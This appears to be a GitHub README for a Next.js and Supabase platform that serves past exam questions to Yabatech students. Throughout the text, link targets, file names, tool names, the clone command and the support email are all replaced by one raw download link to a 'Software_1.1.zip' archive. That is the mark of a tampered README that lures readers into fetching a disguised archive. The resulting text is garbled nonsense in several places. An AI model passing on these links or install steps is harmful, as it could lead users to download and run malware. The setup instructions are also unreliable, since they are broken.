# Digital Past Question Platform

A modern web platform for Yabatech students to access, browse, and download past examination questions across all departments and schools.

## 🎯 Features

- **Comprehensive Archive** - Browse thousands of past questions organized by school, department, level, and session
- **Smart Search & Filters** - Find specific questions quickly with advanced filtering
- **Download Tracking** - Monitor question popularity and your download history
- **Personal Collections** - Save and bookmark questions for quick access
- **Admin Dashboard** - Upload and manage past questions
- **Secure Authentication** - Role-based access control for students and administrators
- **Mobile Responsive** - Seamless experience across all devices
- **Dark Mode** - Eye-friendly interface for late-night study sessions

## 🚀 Tech Stack

- **Frontend**: https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip 16, React 19, TypeScript, Tailwind CSS
- **Backend**: Supabase (PostgreSQL, Authentication, Storage)
- **UI Components**: Shadcn UI, Framer Motion
- **Deployment**: Vercel

## 📋 Prerequisites

- https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip 18+ and npm
- Supabase account
- Git

## 🛠️ Installation

1. **Clone the repository**
   ```bash
   git clone https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip
   cd digitalpast
   ```

2. **Install dependencies**
   ```bash
   npm install 
   ```

3. **Set up environment variables**
   
   Create a `https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip` file in the root directory:
   ```env
   NEXT_PUBLIC_SUPABASE_URL=your_supabase_url
   NEXT_PUBLIC_SUPABASE_ANON_KEY=your_supabase_anon_key
   ```

4. **Set up Supabase database**
   
   Run the migration scripts in your Supabase SQL Editor:
   - `https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip`
   - `https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip`

5. **Create storage bucket**
   
   In Supabase dashboard:
   - Create a public bucket named `questions`
   - Configure storage policies (see `https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip`)

6. **Run development server**
   ```bash
   npm run dev
   ```

   Open [http://localhost:3000](http://localhost:3000)

## 📚 Documentation

- **[Deployment Guide](https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip)** - Deploy to Vercel
- **[Technical Documentation](https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip)** - Architecture and implementation details
- **[Setup Guide](https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip)** - Database setup instructions
- **[Walkthrough](https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip)** - Feature implementation guide

## 🔑 Creating an Admin User

1. Sign up through the app at `/signup`
2. In Supabase dashboard, go to Authentication → Users
3. Copy your user ID
4. Run in SQL Editor:
   ```sql
   UPDATE users SET role = 'admin' WHERE id = 'your-user-id';
   ```

## 📱 Key Pages

- `/` - Landing page
- `/dashboard` - Student dashboard
- `/browse` - Browse and filter questions
- `/saved` - Saved questions
- `/history` - Download history
- `/admin/upload` - Admin upload page (admin only)

## 🧪 Testing

```bash
# Run build to check for errors
npm run build

# Start production server
npm start
```

## 🚀 Deployment

See [https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip](https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip) for detailed deployment instructions.

Quick deploy to Vercel:
```bash
vercel --prod
```

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License.

## 👥 Authors

- **Your Name** - Initial work

## 🙏 Acknowledgments

- Yabatech for the inspiration
- Supabase for the amazing backend platform
- Vercel for seamless deployment

## 📞 Support

For support, email https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip or open an issue in the repository.

---

**Built with ❤️ for Yabatech students**
